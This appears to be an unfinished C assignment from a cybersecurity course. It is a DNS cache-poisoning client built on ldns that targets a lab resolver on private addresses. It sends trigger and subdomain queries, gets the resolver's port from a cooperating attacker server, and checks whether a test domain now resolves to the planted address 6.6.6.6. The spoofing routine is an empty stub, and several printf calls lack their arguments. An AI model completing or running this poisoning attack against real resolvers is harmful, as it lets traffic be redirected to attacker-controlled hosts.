
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <ldns/ldns.h>

#define RESOLVER_IP "192.168.1.203"
#define RESOLVER_DNS_PORT 53
#define ATTACKER_SER_IP "192.168.1.201"

void send_first_request(void) {
    ldns_rdf *name = NULL;
    ldns_pkt *query = NULL;
    uint8_t *wire = NULL;
    size_t wire_size = 0;
    ldns_status status;

    printf("Building ldns query..\n");

    name = ldns_dname_new_frm_str("www.attacker.cybercourse.example.com");
    if (!name) {
        printf("name failed");
        exit(1);
    }

    query = ldns_pkt_query_new(name, LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);
    if (!query) {
        printf("query failed..");
        exit(1);
    }

    status = ldns_pkt2wire(&wire, query, &wire_size);
    if (status != LDNS_STATUS_OK) {
            printf("status failed..");
        exit(1);
    }

    int udp_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_sockfd < 0) {
        printf("udp socket failed..");
        exit(1);
    }

    struct sockaddr_in resolver = {0};
    resolver.sin_family = AF_INET;
    resolver.sin_port = htons(RESOLVER_DNS_PORT);
    inet_pton(AF_INET, RESOLVER_IP, &resolver.sin_addr);

    printf("[CLIENT] Sending trigger DNS query ->resolver (%s:53)...\n", RESOLVER_IP);
    if (sendto(udp_sockfd, wire, wire_size, 0, (struct sockaddr*)&resolver, sizeof(resolver)) < 0) {
        printf("send to failed..");
        exit(1);
    }

    close(udp_sockfd);
    free(wire);

    printf("[CLIENT] Trigger DNS query sent successfully");
}

void send_subdomain_query(const char* domain_name) {
    ldns_rdf *name = NULL;
    ldns_pkt *query = NULL;
    uint8_t *wire = NULL;
    size_t wire_size = 0;
    ldns_status status;

    //creating the name from the domain name
    name = ldns_dname_new_frm_str(domain_name);
    if (!name) {
        printf("ldns_dname_new_frm_str failed..");
        exit(1);
    }

    // building the query
    query = ldns_pkt_query_new(name, LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);
    if (!query) {
        printf("ldns_pkt_query_new failed..");
        ldns_rdf_deep_free(name);
        exit(1);
    }

    //convert to wire format
    status = ldns_pkt2wire(&wire, query, &wire_size);
    if (status != LDNS_STATUS_OK) {
        printf("ldns_pkt2wire failed\n");
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        exit(1);
    }

    int udp_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_sockfd < 0) {
        printf("udp socket failed..\n");
        free(wire);
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        exit(1);
    }

    struct sockaddr_in resolver = {0};
    resolver.sin_family = AF_INET;
    resolver.sin_port = htons((RESOLVER_DNS_PORT));
    inet_pton(AF_INET, RESOLVER_IP, &resolver.sin_addr);

    printf("[CLIENT] Sending subdomain query for %s -> resolver (%s:53)..\n");

    if (sendto(udp_sockfd, wire, wire_size, 0, (struct sockaddr*)&resolver, sizeof(resolver)) < 0) {
        printf("sendto failed..");
        close(udp_sockfd);
        free(wire);
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        exit(1);
    }

    close(udp_sockfd);
    free(wire);
    ldns_pkt_free(query);
    ldns_rdf_deep_free(name);
}

int check_poisoned(void) {
    ldns_rdf *name = NULL;
    ldns_pkt *query = NULL;
    uint8_t *wire = NULL;
    size_t wire_size = 0;
    ldns_status status;

    //creating the name from the domain name
    name = ldns_dname_new_frm_str("www.example1.cybercourse.example.com");
    if (!name) {
        printf("ldns_dname_new_frm_str failed..");
        return 0;
    }

    // building the query
    query = ldns_pkt_query_new(name, LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);
    if (!query) {
        printf("ldns_pkt_query_new failed..");
        ldns_rdf_deep_free(name);
        return 0;
    }

    //convert to wire format
    status = ldns_pkt2wire(&wire, query, &wire_size);
    if (status != LDNS_STATUS_OK) {
        printf("ldns_pkt2wire failed\n");
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        return 0;
    }

    int udp_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_sockfd < 0) {
        printf("udp socket failed..\n");
        free(wire);
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        return 0;
    }

    struct sockaddr_in resolver = {0};
    resolver.sin_family = AF_INET;
    resolver.sin_port = htons((RESOLVER_DNS_PORT));
    inet_pton(AF_INET, RESOLVER_IP, &resolver.sin_addr);

    printf("[CLIENT] Sending subdomain query for %s -> resolver (%s:53)..\n");

    if (sendto(udp_sockfd, wire, wire_size, 0, (struct sockaddr*)&resolver, sizeof(resolver)) < 0) {
        printf("sendto failed..");
        close(udp_sockfd);
        free(wire);
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        return 0;
    }

    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(udp_sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    uint8_t resp_buf[1500];
    struct sockaddr_in src = {0};
    socklen_t srclen = sizeof(src);
    ssize_t n = recvfrom(udp_sockfd, resp_buf, sizeof(resp_buf), 0, (struct sockaddr*)&src, &srclen);
    if (n <= 0) {
        close(udp_sockfd);
        free(wire);
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        return 0;
    }

    ldns_pkt *resp_pkt = NULL;
    status = ldns_wire2pkt(&resp_pkt, resp_buf, (size_t)n);
    if (status != LDNS_STATUS_OK || !resp_pkt) {
        printf("ldns_wire2pkt failed..");
        close(udp_sockfd);
        free(wire);
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        return 0;
    }

    int poisoned = 0;
    ldns_rr_list *answer_list = ldns_pkt_answer(resp_pkt);
    size_t ancount = ldns_rr_list_rr_count(answer_list);
    for (size_t i = 0; i < ancount; i++) {
        ldns_rr *rr = ldns_rr_list_rr(answer_list, i);
        if (ldns_rr_get_type(rr) == LDNS_RR_TYPE_A) {
            ldns_rdf *rdata = ldns_rr_rdf(rr, 0);
            char *ip_str = ldns_rdf2str(rdata);
            if (ip_str) {
                if (strncmp(ip_str, "6.6.6.6", 7) == 0) {
                    poisoned = 1;
                    free(ip_str);
                    break;
                }
                free(ip_str);
            }
        }
    }

    if (poisoned) {
        printf("[CLIENT] Detect poisoing: www.example1.cybercourse.example -> 6.6.6.6\n");

    } else {
        printf("[CLIENT] Not poisoned yet.\n");
    }

    close(udp_sockfd);
    free(wire);
    ldns_pkt_free(query);
    ldns_rdf_deep_free(name);
}

int send_spoof_burst(const char *subdomain, int resolver_port, int budget) {

}

int main(void) {
    // DNS request to the resolver->attacker domain
    send_first_request();
    sleep(1);
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in srv = {0};
    srv.sin_family = AF_INET;
    srv.sin_port = htons(12345);
    inet_pton(AF_INET, ATTACKER_SER_IP, &srv.sin_addr);

    if (connect(sockfd, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        printf("connect failed..");
        exit(1);
    }
    int resolver_port;
    recv(sockfd, &resolver_port, sizeof(resolver_port), 0);

    printf("Client received: %d\n", resolver_port);

    close(sockfd);
    return 0;
}